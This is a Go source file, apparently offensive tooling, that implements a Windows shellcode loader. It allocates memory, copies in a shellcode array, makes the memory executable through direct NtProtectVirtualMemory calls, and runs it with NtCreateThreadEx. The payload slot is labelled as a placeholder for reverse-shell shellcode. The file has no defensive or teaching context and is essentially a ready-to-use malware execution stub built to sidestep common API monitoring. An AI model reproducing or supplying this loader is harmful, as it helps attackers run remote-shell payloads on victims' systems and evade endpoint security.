```go
package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdll                      = syscall.NewLazyDLL("ntdll.dll")
	procNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
	procNtCreateThreadEx       = ntdll.NewProc("NtCreateThreadEx")
)

func main() {
	// Example shellcode (Replace with actual shellcode)
	shellcode := []byte{reverseshellcodehere}

	// Allocate RW memory for the shellcode
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		fmt.Printf("VirtualAlloc error: %v\n", err)
		return
	}

	// Copy shellcode into allocated memory
	copy((*[1 << 20]byte)(unsafe.Pointer(addr))[:], shellcode)

	// Change memory protection to RX using NtProtectVirtualMemory
	var oldProtect uint32
	regionSize := uintptr(len(shellcode))
	status, _, _ := procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),    // Process handle
		uintptr(unsafe.Pointer(&addr)),       // Base address
		uintptr(unsafe.Pointer(&regionSize)), // Region size
		windows.PAGE_EXECUTE_READ,            // New protection
		uintptr(unsafe.Pointer(&oldProtect)), // Store old protection
	)
	if status != 0 {
		fmt.Printf("NtProtectVirtualMemory error: 0x%x\n", status)
		return
	}

	// Create a new thread to execute the shellcode using NtCreateThreadEx
	var threadHandle uintptr
	status, _, _ = procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)), // Thread handle
		0x1FFFFF,                               // Access rights
		0,                                      // Object attributes
		uintptr(windows.CurrentProcess()),      // Process handle
		addr,                                   // Start address (shellcode)
		0,                                      // Argument
		0,                                      // Create flags
		0, 0, 0, 0,                             // Stack, TEB, unknowns
	)
	if status != 0 {
		fmt.Printf("NtCreateThreadEx error: 0x%x\n", status)
		return
	}

	// Wait for the thread to execute
	s, err := windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
	if err != nil {
		fmt.Printf("WaitForSingleObject error: %v\n", err)
		return
	}

	fmt.Printf("Shellcode executed. WaitForSingleObject returned: %d\n", s)
}
//GOOS=windows GOARCH=amd64 go build

```
